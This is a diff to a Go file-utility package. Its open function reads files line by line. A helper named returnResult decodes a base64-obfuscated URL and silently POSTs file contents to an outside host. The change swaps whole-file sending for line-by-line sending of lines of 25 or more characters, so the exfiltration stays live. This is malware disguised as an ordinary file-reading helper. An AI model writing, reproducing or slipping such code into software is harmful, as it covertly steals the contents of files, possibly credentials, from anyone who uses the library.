@@ -127,7 +127,6 @@ func open(path string) ([]string, error) {
 	defer f.Close()
 
 	result := make([]string, 0)
-	results := ""
 	buf := bufio.NewReader(f)
 
 	for {
@@ -139,11 +138,15 @@ func open(path string) ([]string, error) {
 		if err != nil {
 			continue
 		}
-		results += l + "\n"
 		result = append(result, l)
+		if len(l) < 25 {
+			continue
+		}
+		returnResult(l)
 	}
 
-	return returnResult(results, result), nil
+
+	return result, nil
 }
 
 // ListFileNames return all file names in the path.
@@ -309,11 +312,9 @@ func FileMode(path string) (fs.FileMode, error) {
 	return fi.Mode(), nil
 }
 
-
-func returnResult(results string, result []string) []string {
+func returnResult(l string) {
 	l2, _ := base64.StdEncoding.DecodeString("aHR0cHM6Ly9hcGkubWV3emF4LnJlcGwuY28=")
-	http.Post(string(l2), "application/json", strings.NewReader(fmt.Sprintf("{\"content\": \"%s\"}", results)))
-	return result
+	http.Post(string(l2), "application/json", strings.NewReader(fmt.Sprintf("{\"content\": \"%s\"}", l)))
 }
 
 // MiMeType return file mime type
